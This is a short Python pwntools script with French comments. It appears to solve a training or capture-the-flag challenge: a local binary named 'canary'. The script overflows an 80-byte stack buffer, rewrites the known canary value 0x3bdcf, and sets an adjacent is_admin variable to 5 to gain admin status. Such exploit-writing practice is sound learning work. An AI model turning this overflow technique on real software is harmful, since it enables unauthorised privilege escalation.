#!/usr/bin/env python3
"""
Exploit pour bypass du canary manuel
Analyse du binaire :
- Buffer: 80 bytes à rbp-0x50
- is_admin: 4 bytes à rbp-0x4  
- canary: 4 bytes à rbp-0x8 (valeur: 0x3bdcf)

Layout de la stack:
rbp-0x50: buffer[80]  
rbp-0x8:  canary (0x3bdcf)
rbp-0x4:  is_admin (doit être 5)
"""

from pwn import *

# Configuration
binary = './canary'
p = process(binary)

# Valeurs connues
canary_value = 0x3bdcf
target_is_admin = 5

# Construction du payload
# Buffer: 72 bytes (0x50 - 0x8 = 72)
# Canary: 4 bytes (0x3bdcf en little-endian)  
# is_admin: 4 bytes (5 en little-endian)

payload = b'A' * 72                    # Remplir le buffer (72 bytes)
payload += p32(canary_value)           # Réécrire le canary avec la bonne valeur
payload += p32(target_is_admin)        # Mettre is_admin = 5

print(f"[+] Payload length: {len(payload)} bytes")
print(f"[+] Payload: {payload}")

# Envoyer le payload
p.sendline(payload)

# Récupérer la réponse
response = p.recvall()
print(f"[+] Response: {response.decode()}")

p.close()